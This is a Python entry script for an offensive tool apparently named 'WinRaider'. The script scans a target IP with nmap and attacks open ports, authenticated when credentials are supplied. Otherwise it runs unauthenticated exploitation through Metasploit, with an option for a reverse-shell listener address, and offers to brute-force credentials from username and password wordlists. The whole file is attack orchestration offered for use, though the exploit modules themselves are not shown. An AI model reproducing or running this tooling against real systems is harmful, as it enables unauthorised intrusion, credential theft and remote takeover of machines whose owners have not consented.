import argparse
import subprocess
from scanner import nmap_scan, filter_open_ports
from exploit import attack_with_credentials, attack_without_credentials
from brute import brute_force
from utils import get_banner, get_epilog

def main():
    parser = argparse.ArgumentParser(
        prog="WinRaider",
        description=get_banner(),
        epilog=get_epilog(),
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-w', '--wordlist', default='wordlists/passwords.txt', help='Password wordlist')
    parser.add_argument('--users', default='wordlists/users.txt', help='Username wordlist')
    parser.add_argument('--msfpath', help='Path to Metasploit msfconsole')
    parser.add_argument('--lhost', help='Local host IP for Metasploit reverse shells')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
    
    args = parser.parse_args()
    
    if not args.quiet:
        print(get_banner())
    
    print(f"\n[+] Target: {args.target}")
    if args.username:
        print(f"[+] Username: {args.username}")
    if args.verbose:
        print("[+] Verbose mode enabled")
    
    json_data = nmap_scan(args.target)
    open_ports = filter_open_ports(json_data)
    print(f"\n[+] Open ports: {open_ports}")
    
    if args.username and args.password:
        print("[+] Credentials provided. Attempting authenticated attack...")
        attack_with_credentials(args.target, args.username, args.password, open_ports)
    else:
        print("[!] No credentials provided.")
        print("[?] Attempting unauthenticated attacks (vulnerability scanning)...")
        
        msf_path = None
        if args.msfpath:
            msf_path = args.msfpath
        else:
            check = subprocess.run(['where', 'msfconsole'], capture_output=True, text=True)
            if check.returncode == 0:
                msf_path = check.stdout.strip().split('\n')[0]
        
        attack_without_credentials(args.target, open_ports, msf_path)
        
        while True:
            q = input("\n[?] Do you want to brute force credentials? (y/n): ").strip().lower()
            if q == "n":
                print("[-] Exiting.")
                return
            elif q == "y":
                username, password = brute_force(args.target, args.users, args.wordlist)
                if username and password:
                    print(f"\n[+] Credentials found: {username}:{password}")
                    args.username = username
                    args.password = password
                    attack_with_credentials(args.target, username, password, open_ports)
                    return
                else:
                    print("[-] Brute force failed. Exiting.")
                    return
            else:
                print("[-] Invalid input. Please enter 'y' or 'n'.")

if __name__ == "__main__":
    main()